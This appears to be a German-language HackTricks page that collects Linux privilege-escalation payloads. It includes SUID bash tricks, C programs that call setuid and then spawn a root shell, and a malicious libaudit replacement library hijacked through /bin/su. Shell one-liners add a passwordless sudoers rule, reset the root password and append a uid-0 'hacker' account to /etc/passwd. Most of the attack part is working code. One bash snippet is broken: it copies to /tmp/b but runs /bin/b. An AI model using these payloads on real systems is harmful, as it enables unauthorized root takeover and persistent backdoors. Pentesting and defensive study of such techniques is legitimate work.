# Payloads zur Ausführung

{{#include ../../banners/hacktricks-training.md}}

## Bash

`bash -p` aktiviert den privileged mode: Wenn Bash mit unterschiedlichen realen und effektiven IDs startet, setzt es die effektive ID nicht auf die reale ID zurück. Die resultierende shell hängt weiterhin von den vorhandenen Credentials des Aufrufers ab.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C

`setresuid` ändert die reale, effektive und gespeicherte ID, sofern dies zulässig ist, während `setuid` die effektive ID ändert und für einen privilegierten Aufrufer möglicherweise auch die reale und gespeicherte ID setzt. `execve` ersetzt das aktuelle Prozessabbild durch das angeforderte Programm.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Diese Beispiele verzichten auf die Prüfung von Rückgabewerten; beide Aufrufe zur Änderung von Zugangsdaten können selbst für UID 0 fehlschlagen.<sup>[[2]](#references)[[3]](#references)</sup>
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## Überschreiben einer Datei zur Rechteausweitung

### Häufige Dateien

Dies sind häufige lokale Dateien und Schnittstellen zur Rechtekontrolle: `/etc/passwd` speichert Kontodatensätze mit sieben Feldern, `/etc/shadow` speichert optionale verschlüsselte Passwortdaten, `sudoers` definiert sudo-Berechtigungen und Tags wie `NOPASSWD`, und Dockers Standard-Daemon-Endpunkt ist ein Unix-Socket unter `/var/run/docker.sock`; der Zugriff auf diesen Socket kann Kontrolle auf Root-Ebene über seinen Host ermöglichen.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Benutzer mit Passwort zu _/etc/passwd_ hinzufügen
- Passwort in _/etc/shadow_ ändern
- Benutzer in _/etc/sudoers_ zu sudoers hinzufügen
- Docker über den Docker-Socket missbrauchen, der sich normalerweise unter _/run/docker.sock_ oder _/var/run/docker.sock_ befindet

### Überschreiben einer Bibliothek

Prüfe, welche gemeinsam genutzten Bibliotheken eine Binärdatei verwendet; in diesem Beispiel wird `/bin/su` mit `ldd` untersucht.<sup>[[9]](#references)</sup>
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
`ldd` meldet Abhängigkeiten von Shared Objects, während der dynamische Linker ELF-Metadaten und seine Suchregeln verwendet, um sie zur Laufzeit zu laden.<sup>[[9]](#references)[[10]](#references)</sup>

Um einen Kandidaten zu untersuchen, verwenden Sie `objdump -T`, um die dynamische Symboltabelle von `su` auszugeben und nach Audit-Namen zu filtern.<sup>[[11]](#references)</sup>
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
`audit_open`, `audit_log_user_message` und `audit_log_acct_message` sind libaudit-Funktionen; `audit_fd` wird in dieser Ausgabe als ein in `.bss` von `su` definiertes Datenobjekt angezeigt.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Eine Ersatzbibliothek muss kompatible Definitionen für die undefinierten Symbole exportieren, die der Loader auflöst; nicht übereinstimmende Funktions-/Daten-ABIs können weiterhin dazu führen, dass der Prozess fehlschlägt, wenn diese Symbole relocatiert oder aufgerufen werden.<sup>[[10]](#references)[[11]](#references)</sup>

GCCs `constructor`-Attribut bewirkt, dass `inject` auf unterstützten Targets automatisch vor `main` aufgerufen wird.<sup>[[15]](#references)</sup>
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
Wenn die Ersetzung erfolgreich von einem privilegierten **`/bin/su`**-Prozess geladen wird, kann dieser Constructor **`/bin/bash`** mit den Privilegien dieses Prozesses starten; das genaue Ergebnis hängt von der Umgebung ab.<sup>[[10]](#references)[[15]](#references)</sup>

## Skripte

Kannst du root dazu bringen, etwas auszuführen?

`sudoers` verwendet das Tag `NOPASSWD` in Policy-Einträgen, `chpasswd` liest `user:password`-Paare aus der Standardeingabe, und `/etc/passwd` verwendet sieben durch Doppelpunkte getrennte Account-Felder; die folgenden Beispiele setzen voraus, dass die relevanten Dateien für den Prozess, der sie ausführt, beschreibbar sind.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>

### **www-data zu sudoers**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **root-Passwort ändern**
```bash
echo "root:hacked" | chpasswd
```
### Neuen root-Benutzer zu `/etc/passwd` hinzufügen

Die endgültige Payload hängt von einem Ziel ab, das den generierten `crypt`-Hash akzeptiert: Debians `mkpasswd -m sha-512` verwendet SHA-512 crypt (`$6$`), während OpenSSLs `passwd -1 -salt` den MD5-basierten BSD-Algorithmus (`$1$`) verwendet.<sup>[[17]](#references)[[18]](#references)</sup>
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
## References

- [1] [Das set-Builtin (Bash Reference Manual)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
- [2] [setresuid(2) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/setresuid.2.html)
- [3] [setuid(2) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/setuid.2.html)
- [4] [execve(2) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/execve.2.html)
- [5] [passwd(5) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [6] [sudoers(5) — Debian-Manpages](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
- [7] [Den Docker-Daemon-Socket schützen](https://docs.docker.com/engine/security/protect-access/)
- [8] [dockerd — Docker-Dokumentation](https://docs.docker.com/reference/cli/dockerd/)
- [9] [ldd(1) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [10] [ld.so(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [11] [objdump (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/objdump.html)
- [12] [audit_open(3) — Debian-Manpages](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
- [13] [audit_log_user_message(3) — Debian-Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
- [14] [audit_log_acct_message(3) — Debian-Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
- [15] [Gemeinsame Attribute (Using the GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [16] [chpasswd(8) — Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
- [17] [mkpasswd.c — Debian-Quellen](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
- [18] [openssl-passwd — OpenSSL-Dokumentation](https://docs.openssl.org/master/man1/openssl-passwd/)
{{#include ../../banners/hacktricks-training.md}}
